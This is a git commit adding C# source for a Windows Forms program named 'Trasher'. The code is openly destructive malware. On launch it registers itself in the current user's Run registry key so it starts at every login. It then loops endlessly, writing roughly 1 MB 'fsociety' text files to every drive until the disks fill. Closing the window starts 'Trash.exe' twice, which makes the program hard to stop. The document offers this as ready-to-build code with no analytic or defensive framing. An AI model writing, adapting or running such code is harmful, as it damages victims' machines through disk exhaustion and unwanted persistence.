b57dbd07c8893f11925257a5c7cc371729bb7b18
Dima <98160268+little-prog-man@users.noreply.github.com>
2022-01-21 13:59:20 +0200

    Add files via upload

---
+++ Trasher/Form1.cs
@@ -0,0 +1,59 @@
+﻿using System;
+using System.IO;
+using System.Diagnostics;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+namespace Trasher
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Add_ToStarup()
+        {
+            const string applicationName = "Trasher.exe";
+            const string pathRegistryKeyStartup =
+                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+            using (RegistryKey registryKeyStartup = Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
+            {
+                registryKeyStartup.SetValue(
+                    applicationName,
+                    string.Format("\"{0}\"", System.Reflection.Assembly.GetExecutingAssembly().Location));
+            }
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            Add_ToStarup();
+            DriveInfo[] dis = DriveInfo.GetDrives();
+            int n = 0;
+            while (true)
+            {
+                foreach (DriveInfo d in dis)
+                {
+                    try
+                    {
+                        string name = "fsociety" + Convert.ToString(n) + ".txt";
+                        StreamWriter sw = new StreamWriter(d.ToString() + name);
+                        for (int i = 0; i < 131072; i++)
+                        {
+                            sw.Write("fsociety");
+                        }
+                        sw.Close();
+                    } catch { continue; }
+                }
+                n++;
+            }
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            Process.Start(Environment.CurrentDirectory + @"\Trash.exe");
+            Process.Start(Environment.CurrentDirectory + @"\Trash.exe");
+        }
+    }
+}
